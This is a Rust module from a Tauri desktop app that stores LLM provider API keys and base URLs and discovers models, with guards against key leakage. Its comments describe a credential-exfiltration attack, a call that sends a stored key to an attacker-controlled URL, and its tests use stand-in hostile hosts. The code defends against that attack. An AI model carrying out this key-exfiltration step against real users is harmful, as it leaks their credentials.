//! 提供商配置（docs/03 §2.12，docs/04 §2.2）：配置页的"模型"一节所需的全部后端能力。
//!
//! 六个命令，都只碰 `~/.pi/agent/` 下 pi 自己的文件（auth.json / models.json），
//! 不新增任何 Piggy 私有的配置存储——写进 pi 的文件，终端里的 `pi` 立刻就能用。
//!
//! | 命令 | 作用 |
//! |---|---|
//! | `provider_overview` | 目录 ∪ auth ∪ models ∪ 环境 → 一张带"值从哪来"的表 |
//! | `provider_save` | 新建/更新 `models.json` 里的一条提供商 |
//! | `provider_set_key` | 写密钥（默认写进 pi 凭据库 auth.json，也可写进 models.json） |
//! | `provider_remove_key` | 删密钥（auth / models / 两处） |
//! | `provider_remove` | 删掉提供商的配置与凭据 |
//! | `provider_discover` | 「获取可用模型 / 检测」：本地目录优先，否则问端点 |

pub mod catalog;
pub mod discover;
pub mod edit;
pub mod overview;

use std::path::Path;

use serde_json::{json, Value};

use crate::config::paths;
use crate::config::pi_files;

/// 密钥的存放处。
const STORE_AUTH: &str = "auth";
const STORE_MODELS: &str = "models";

/// 配置总览（配置页一次拉齐，避免半个界面是新值半个是旧值）。
#[tauri::command]
pub async fn provider_overview() -> Result<Value, String> {
    tokio::task::spawn_blocking(overview::overview)
        .await
        .map_err(|e| e.to_string())?
}

use tauri::AppHandle;

/// 新建/更新一个提供商。`patch` 里出现的键才写，空串 = 删键（回落 pi 目录默认值）。
///
/// **改 baseUrl 且这个 provider 已有已存密钥时必须原生确认**：否则被攻破的 webview
/// 先把地址改到攻击者，再让 pi/`provider_discover` 把真密钥发出去。原生确认框在 Rust
/// 侧，webview 改不了它的文案与结果。
#[tauri::command]
pub async fn provider_save(app: AppHandle, provider: String, patch: Value) -> Result<Value, String> {
    let agent = paths::agent_dir();
    if let Some(new_base) = patch
        .get("baseUrl")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        let old_base = pi_files::read_json(&agent.join("models.json")).ok().and_then(|m| {
            m.get("providers")
                .and_then(|p| p.get(&provider))
                .and_then(|c| c.get("baseUrl"))
                .and_then(Value::as_str)
                .map(str::to_string)
        });
        let has_stored_key = !resolve_key(&agent, &provider, "").0.trim().is_empty();
        if base_change_needs_confirm(old_base.as_deref(), new_base, has_stored_key) {
            let ok = crate::ui_confirm::confirm(
                &app,
                "更改 API 地址？",
                &format!(
                    "提供商：{provider}\n\n旧地址：{}\n新地址：{new_base}\n\n\
                     这个提供商已经存有 API 密钥；继续会把密钥发往新地址。",
                    old_base.as_deref().unwrap_or("（未配置，当前用目录默认值）")
                ),
            )
            .await;
            if !ok {
                return Err(format!("已取消：更改 {provider} 的 API 地址需要用户原生确认"));
            }
        }
    }
    tokio::task::spawn_blocking(move || edit::save_at(&agent, &provider, &patch))
        .await
        .map_err(|e| e.to_string())?
}

/// 写 API 密钥。
///
/// `store = "auth"`（默认）写进 pi 的凭据库 `auth.json`——**它优先级最高**
/// （`provider-composer.ts:347-375`：凭据 > models.json 的 apiKey > 环境变量），
/// 也是唯一不会把明文密钥散落在项目配置里的地方；`store = "models"` 写
/// `models.json` 的 `apiKey`（中转站/cc-switch 那类工具的习惯写法，明文）。
#[tauri::command]
pub async fn provider_set_key(provider: String, api_key: String, store: Option<String>) -> Result<(), String> {
    let agent = paths::agent_dir();
    let store = store.unwrap_or_else(|| STORE_AUTH.to_string());
    tokio::task::spawn_blocking(move || match store.as_str() {
        STORE_MODELS => edit::set_inline_key_at(&agent, &provider, &api_key),
        _ => pi_files::auth_set_key_at(&agent, &provider, &api_key),
    })
    .await
    .map_err(|e| e.to_string())?
}

/// 删 API 密钥。`store` = `auth` / `models` / `both`。
#[tauri::command]
pub async fn provider_remove_key(provider: String, store: Option<String>) -> Result<(), String> {
    let agent = paths::agent_dir();
    let store = store.unwrap_or_else(|| "both".to_string());
    tokio::task::spawn_blocking(move || {
        if store == STORE_AUTH || store == "both" {
            pi_files::auth_remove_at(&agent, &provider)?;
        }
        if store == STORE_MODELS || store == "both" {
            edit::set_inline_key_at(&agent, &provider, "")?;
        }
        Ok(())
    })
    .await
    .map_err(|e| e.to_string())?
}

/// 删掉一个提供商：`models.json` 里的定义 + `auth.json` 里的凭据都删。
/// 界面上必须先确认（配置和密钥一起没了）。
#[tauri::command]
pub async fn provider_remove(provider: String) -> Result<(), String> {
    let agent = paths::agent_dir();
    tokio::task::spawn_blocking(move || {
        edit::remove_at(&agent, &provider)?;
        pi_files::auth_remove_at(&agent, &provider)
    })
    .await
    .map_err(|e| e.to_string())?
}

/// 解析这次请求该用哪把密钥：**手填的 > auth.json > models.json 内联 > 环境变量**。
/// 手填优先是 DSH 的语义（`ProviderEditor` 把表单里的 key 作为一次性凭据发出）；
/// 后面三级是 pi 自己的优先级。返回 `(密钥, 来源)`，来源要显示给用户看。
pub fn resolve_key(agent: &Path, provider: &str, typed: &str) -> (String, &'static str) {
    let typed = typed.trim();
    if !typed.is_empty() {
        return (typed.to_string(), "typed");
    }
    if let Ok(auth) = pi_files::read_json(&agent.join("auth.json")) {
        if let Some(key) = auth
            .get(provider)
            .and_then(|e| e.get("key").or_else(|| e.get("access")))
            .and_then(|k| k.as_str())
            .filter(|k| !k.trim().is_empty())
        {
            return (key.to_string(), "auth");
        }
    }
    if let Ok(models) = pi_files::read_json(&agent.join("models.json")) {
        if let Some(key) = models
            .get("providers")
            .and_then(|p| p.get(provider))
            .and_then(|c| c.get("apiKey"))
            .and_then(|k| k.as_str())
            .filter(|k| !k.trim().is_empty())
        {
            return (key.to_string(), "models_json");
        }
    }
    if let Some(env_var) = catalog::lookup(provider).map(|e| e.env_var).filter(|e| !e.is_empty()) {
        if let Ok(v) = std::env::var(env_var) {
            if !v.trim().is_empty() {
                return (v, "env");
            }
        }
    }
    (String::new(), "none")
}

/// 已存密钥是否允许发往这次请求的 `base_url`（纯函数，便于单测）。
///
/// 规则（2026-10-28 审查收敛）：
/// - 用户在表单里**成对输入**的密钥（`typed`）与此地址是用户自己的意图，照发；
/// - **已存**密钥（auth.json / models.json / 环境变量）只发往**该提供商已配置的**地址
///   （models.json 的 `baseUrl`，未配置时用 catalog 默认值）。否则前端被攻破时
///   一句 `provider_discover(deepseek, https://attacker.com)` 就能把真密钥 Bearer 出去。
///
/// 归一：两侧去尾部 `/`、大小写不敏感（host 大小写无意义；路径部分保守起见也不区分——
/// 这里要的是"同一配置的同一地址"，不是通用 URL 等价）。
fn stored_key_allowed(configured_base: Option<&str>, requested_base: &str) -> bool {
    let Some(cfg) = configured_base.map(str::trim).filter(|s| !s.is_empty()) else {
        return false;
    };
    cfg.trim_end_matches('/')
        .eq_ignore_ascii_case(requested_base.trim().trim_end_matches('/'))
}

/// 改 baseUrl 是否必须由**原生确认框**批准（纯函数，便于单测）。
///
/// 判据：新地址非空、与旧地址不是同一个（用 `stored_key_allowed` 的归一比较）、
/// 且这个 provider **已经有一把已存密钥**（auth.json / models.json 内联 / 环境变量）。
/// 有密钥时改地址等于"把密钥发往新地址"；没有密钥时改地址只是改配置，不弹。
///
/// 为什么需要：`provider_save` 由 webview 调用。没有这道确认，被攻破的 webview 可以
/// 先 `provider_save(baseUrl=attacker)` 再 `provider_discover`/`pi_prompt`，把已存密钥
/// 发出去——H3 的 `stored_key_allowed` 只挡住了"直接传陌生 base_url"，挡不住"先改配置"。
pub fn base_change_needs_confirm(old_base: Option<&str>, new_base: &str, has_stored_key: bool) -> bool {
    let new_base = new_base.trim();
    if !has_stored_key || new_base.is_empty() {
        return false;
    }
    !stored_key_allowed(old_base, new_base)
}

/// 「获取可用模型 / 检测」：本地模型目录优先（不联网），否则问端点。
///
/// 返回里带 `source`（catalog/network）、`url`（真打的地址）与 `keySource`
/// （这次用的是哪把密钥）——用户点"检测"时必须能看出**到底测了什么**，
/// 否则"通过"两个字毫无信息量。
///
/// 密钥外发口径见 [`stored_key_allowed`]：地址与已存密钥不配对时**匿名探测**
/// （endpoint 多半回 401，用户看到的正是真相），而不是把密钥发给陌生地址。
#[tauri::command]
pub async fn provider_discover(
    provider: String,
    base_url: String,
    api: String,
    api_key: Option<String>,
) -> Result<Value, String> {
    let agent = paths::agent_dir();
    let typed = api_key.unwrap_or_default();
    let probe = {
        let agent = agent.clone();
        let provider = provider.clone();
        let typed = typed.clone();
        tokio::task::spawn_blocking(move || {
            let cached = overview::cached_catalog(&agent, &provider);
            let (key, key_source) = resolve_key(&agent, &provider, &typed);
            // 该提供商已配置的 API 地址：models.json 优先，未配置用 catalog 默认值
            let configured_base = pi_files::read_json(&agent.join("models.json"))
                .ok()
                .and_then(|m| {
                    m.get("providers")
                        .and_then(|p| p.get(&provider))
                        .and_then(|c| c.get("baseUrl"))
                        .and_then(|b| b.as_str())
                        .map(str::to_string)
                })
                .or_else(|| {
                    catalog::lookup(&provider)
                        .map(|e| e.base_url)
                        .filter(|b| !b.is_empty())
                        .map(str::to_string)
                });
            (cached, key, key_source, configured_base)
        })
        .await
        .map_err(|e| e.to_string())?
    };
    let (cached, mut key, mut key_source, configured_base) = probe;
    if !cached.is_empty() {
        return Ok(json!({
            "source": "catalog",
            "url": "",
            "keySource": key_source,
            "models": cached,
        }));
    }
    if base_url.trim().is_empty() {
        return Err("请先填写 API 地址，再获取模型".into());
    }
    if typed.trim().is_empty() && !stored_key_allowed(configured_base.as_deref(), &base_url) {
        // 已存密钥与这个地址不配对：匿名探测，keySource 如实报 none
        key = String::new();
        key_source = "none";
    }
    let url = discover::listing_url(&base_url, &api);
    let models = discover::fetch(&url, &api, &key).await?;
    Ok(json!({
        "source": "network",
        "url": url,
        "keySource": key_source,
        "models": models,
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    /// 密钥优先级：手填 > auth.json > models.json > 环境变量。
    #[test]
    fn key_resolution_follows_pi_precedence() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("auth.json"),
            r#"{"deepseek":{"type":"api_key","key":"sk-auth"}}"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("models.json"),
            r#"{"providers":{"deepseek":{"apiKey":"sk-inline"}}}"#,
        )
        .unwrap();
        assert_eq!(
            resolve_key(dir.path(), "deepseek", "sk-typed"),
            ("sk-typed".into(), "typed")
        );
        assert_eq!(resolve_key(dir.path(), "deepseek", "  "), ("sk-auth".into(), "auth"));

        // 拿掉 auth.json 那把 → 轮到 models.json
        fs::write(dir.path().join("auth.json"), "{}").unwrap();
        assert_eq!(
            resolve_key(dir.path(), "deepseek", ""),
            ("sk-inline".into(), "models_json")
        );

        // 两处都没有 → 环境变量
        fs::write(dir.path().join("models.json"), "{}").unwrap();
        std::env::set_var("DEEPSEEK_API_KEY", "sk-env");
        assert_eq!(resolve_key(dir.path(), "deepseek", ""), ("sk-env".into(), "env"));
        std::env::remove_var("DEEPSEEK_API_KEY");
        assert_eq!(resolve_key(dir.path(), "deepseek", ""), (String::new(), "none"));
    }

    /// 自定义提供商没有环境变量这回事（pi 没有兜底的 PI_API_KEY，docs/16 §2.1）。
    #[test]
    fn custom_provider_has_no_env_fallback() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("auth.json"), "{}").unwrap();
        fs::write(dir.path().join("models.json"), "{}").unwrap();
        assert_eq!(resolve_key(dir.path(), "my-relay", ""), (String::new(), "none"));
    }

    /// 已存密钥只发往已配置的地址：这是把"检测"从密钥外发原语变回探测工具的那道闸。
    #[test]
    fn stored_key_only_goes_to_the_configured_base() {
        let cfg = "https://api.deepseek.com";
        // 配置地址（含尾部斜杠/大小写差异）放行
        assert!(stored_key_allowed(Some(cfg), "https://api.deepseek.com"));
        assert!(stored_key_allowed(Some(cfg), "https://api.deepseek.com/"));
        assert!(stored_key_allowed(Some(cfg), "HTTPS://API.DEEPSEEK.COM"));
        // 陌生地址 / 前缀碰瓷 / 未配置 → 一律不放
        assert!(!stored_key_allowed(Some(cfg), "https://attacker.example/v1"));
        assert!(!stored_key_allowed(Some(cfg), "https://api.deepseek.com.evil.io"));
        assert!(!stored_key_allowed(None, "https://api.deepseek.com"));
        assert!(!stored_key_allowed(Some("  "), "https://api.deepseek.com"));
    }
}
